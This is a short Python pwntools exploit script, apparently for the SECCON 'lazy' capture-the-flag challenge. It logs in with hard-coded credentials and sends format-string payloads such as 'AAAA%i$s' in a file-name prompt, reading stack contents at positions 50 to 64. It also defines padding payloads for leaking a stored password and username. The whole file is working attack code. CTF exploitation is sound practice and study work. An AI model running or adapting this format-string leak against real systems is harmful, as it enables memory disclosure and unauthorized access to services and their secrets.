#!/usr/bin/python

from pwn import *

username = "_H4CK3R_"
password = "3XPL01717"

leak_password_payload = "A" * 29 + "%s"
leak_username_payload = "A" * 29 + "B" * 32 + "%s"

def get_connection():
	#r = remote("lazy.chal.seccon.jp", 33333)
	r = process("./lazy")
	return r

def get_loggedin_connection(username, password):
	r = get_connection()
	r.recvline_startswith("3: Exit")
	r.sendline("2") # Login
	r.sendline(username)
	r.sendline(password)
	return r

def get_stack_variable(i, s):
	r = get_loggedin_connection(username, password)
	r.sendline("4") # Manage
	r.recvline_startswith("Input file name")
	r.sendline("AAAA%" + str(i) + "$" + s)
	return r.recvline_startswith("Filename : ").replace("Filename : AAAA", "")
	r.close()

def leak_stack_from_to_with(start, end, formatter):
	for i in range(start, end):
		print("Stack position {}: ".format(i) + get_stack_variable(i, formatter))

leak_stack_from_to_with(50, 65, "s")